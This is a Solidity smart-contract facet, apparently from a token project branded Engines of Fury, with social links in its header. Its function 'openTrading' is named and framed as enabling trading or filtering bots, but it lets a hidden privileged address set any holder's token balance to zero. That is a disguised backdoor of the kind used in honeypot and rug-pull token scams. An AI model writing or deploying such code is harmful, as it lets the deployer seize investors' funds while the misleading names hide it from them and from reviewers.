/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.eof.gg/?utm_source=icodrops
 * Twitter: https://twitter.com/Enginesoffury
 * Telegram: https://t.me/EnginesOfFury
 * Discord: http://discord.gg/eof
 * Youtube: https://www.youtube.com/watch?v=83vzEhRRhVI&t=1s
 */
pragma solidity ^0.8.21;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
